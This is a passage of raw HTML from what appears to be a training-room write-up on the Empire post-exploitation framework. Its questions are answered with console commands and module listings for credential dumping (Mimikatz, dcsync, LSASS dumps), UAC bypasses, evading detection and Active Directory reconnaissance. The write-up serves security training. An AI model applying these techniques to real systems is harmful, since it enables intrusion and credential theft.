d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>interact</code></p><ol start="4"><li>What about if we wanted to list any usernames and passwords we have gathered?</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">(Empire: FKRDZB8C) &gt; creds</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Credentials:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  CredID  CredType   Domain                   UserName         Host             Password</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  ------  --------   ------                   --------         ----             --------</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>creds</code></p><ol start="5"><li>And if we wanted to &#x27;deactivate&#x27; an agent for a while to avoid detection?</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">(Empire: FKRDZB8C) &gt; sleep</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">(Empire: FKRDZB8C) &gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>sleep</code></p><ol start="6"><li>How about if we wanted to delete an agent or disconnect it?</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">(Empire: FKRDZB8C) &gt; kill</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[!] Please enter a process name or ID.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>kill</code></p><ol start="7"><li>Moving into the post exploitation modules, what command can we use to search through these?</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">(Empire: FKRDZB8C) &gt; searchmodule</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[!] Please enter a search term.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>searchmodule</code></p><ol start="8"><li>We&#x27;ll start with the most important module, find the module which plays a specific AC/DC song.</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">(Empire: FKRDZB8C) &gt; searchmodule thunderstruck</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> python/trollsploit/osx/thunderstruck</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Open Safari in the background and play Thunderstruck.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/trollsploit/thunderstruck</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Play&#x27;s a hidden version of AC/DC&#x27;s Thunderstruck video while maxing</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        out a computer&#x27;s volume.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>powershell/trollsploit/thunderstruck</code></p><ol start="9"><li>What if we wanted to perform an lsa dump with a certain popular windows credential gathering tool?</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">(Empire: FKRDZB8C) &gt; searchmodule lsa</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/credentials/invoke_internal_monologue*</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Uses the Internal Monologue attack to force easily-decryptable Net-</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        NTLMv1 responses over localhost and without directly touching LSASS.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        https://github.com/eladshamir/Internal-Monologue</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/credentials/mimikatz/dcsync</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Runs PowerSploit&#x27;s Invoke-Mimikatz function to extract a given account</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        password through Mimikatz&#x27;s lsadump::dcsync module. This doesn&#x27;t need</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        code execution on a given DC, but needs to be run from a user context</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        with DA equivalent privileges.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/credentials/mimikatz/lsadump*</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Runs PowerSploit&#x27;s Invoke-Mimikatz function to extract a particular</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        user hash from memory. Useful on domain controllers.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/credentials/mimikatz/dcsync_hashdump</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Runs PowerSploit&#x27;s Invoke-Mimikatz function to collect all domain</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        hashes using Mimikatz&#x27;slsadump::dcsync module. This doesn&#x27;t need code</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        execution on a given DC, but needs to be run froma user context with</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        DA equivalent privileges.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/credentials/mimikatz/pth*</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Runs PowerSploit&#x27;s Invoke-Mimikatz function to execute sekurlsa::pth</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        to create a new process. with a specific user&#x27;s hash. Use</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        credentials/tokens to steal the token afterwards.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/collection/minidump</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Generates a full-memory dump of a process. Note: To dump another</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        user&#x27;s process, you must be running from an elevated prompt (e.g to</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        dump lsass)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/management/honeyhash*</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Inject artificial credentials into LSASS.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/credentials/mimikatz/lsadump*</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Runs PowerSploit&#x27;s Invoke-Mimikatz function to extract a particular</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        user hash from memory. Useful on domain controllers.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ol start="10"><li>Sometime we might not have the permissions level that we require to perform further actions, what module set might we have to use to get around UAC?</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">(Empire: FKRDZB8C) &gt; searchmodule uac</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/host/get_uaclevel</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Enumerates UAC level</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/privesc/bypassuac_wscript</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Drops wscript.exe and a custom manifest into C:\Windows\ and then</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        proceeds to execute VBScript using the wscript executablewith the new</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        manifest. The VBScript executed by C:\Windows\wscript.exe will run</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        elevated.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/privesc/bypassuac_env</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Bypasses UAC (even with Always Notify level set) by by performing an</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        registry modification of the &quot;windir&quot; value in &quot;Environment&quot; based on</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        James Forshaw</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        findings(https://tyranidslair.blogspot.cz/2017/05/exploiting-</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        environment-variables-in.html)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/privesc/bypassuac_tokenmanipulation</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Bypass UAC module based on the script released by Matt Nelson</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        @enigma0x3 at Derbycon 2017</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/privesc/bypassuac_sdctlbypass</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Bypasses UAC by performing an registry modification for sdclt (based</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        onhttps://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        exe/)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/privesc/bypassuac_eventvwr</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Bypasses UAC by performing an image hijack on the .msc file extension</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        and starting eventvwr.exe. No files are dropped to disk, making this</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        opsec safe.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/privesc/ask</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Leverages Start-Process&#x27; -Verb runAs option inside a YES-Required loop</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        to prompt the user for a high integrity context before running the</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        agent code. UAC will report Powershell is requesting Administrator</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        privileges. Because this does not use the BypassUAC DLLs, it should</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        not trigger any AV alerts.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/privesc/bypassuac_fodhelper</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Bypasses UAC by performing an registry modification for FodHelper</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        (based onhttps://winscripting.blog/2017/05/12/first-entry-welcome-and-</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        uac-bypass/)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/privesc/bypassuac</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Runs a BypassUAC attack to escape from a medium integrity process to a</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        high integrity process. This attack was originally discovered by Leo</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Davidson. Empire uses components of MSF&#x27;s bypassuac injection</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        implementation as well as an adapted version of PowerSploit&#x27;s Invoke--</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Shellcode.ps1 script for backend lifting.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>bypassuac</code></p><ol start="11"><li>What module family allows us to gather additional information about the network we are on?</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">(Empire: FKRDZB8C) &gt; searchmodule network</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> python/situational_awareness/network/port_scan</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Simple Port Scanner.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> python/situational_awareness/network/gethostbyname</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Uses Python&#x27;s socket.gethostbyname(&quot;example.com&quot;) function to resolve</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        host names on a remote agent.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> python/situational_awareness/network/smb_mount</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        This module will attempt mount an smb share and execute a command on</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        it.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> python/situational_awareness/network/find_fruit</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Searches for low-hanging web applications.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> python/situational_awareness/network/http_rest_api</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Interacts with a HTTP REST API and returns the results back to the</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        screen.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> python/situational_awareness/network/active_directory/get_fileservers</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        This module will list file servers</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> python/situational_awareness/network/active_directory/get_groups</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        This module will list all groups in active directory</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> python/situational_awareness/network/active_directory/get_ous</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        This module will list all OUs from active directory</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> python/situational_awareness/network/active_directory/get_userinformation</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        This module will return the user profile specified</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> python/situational_awareness/network/active_directory/dscl_get_users</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        This module will use the current user context to query active</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        directory for a list of users.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> python/situational_awareness/network/active_directory/get_users</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        This module list users found in Active Directory</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> python/situational_awareness/network/active_directory/get_domaincontrollers</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        This module will list all domain controllers from active directory</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> python/situational_awareness/network/active_directory/get_groupmembers</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        This module will return a list of group members</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> python/situational_awareness/network/active_directory/dscl_get_groupmembers</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" 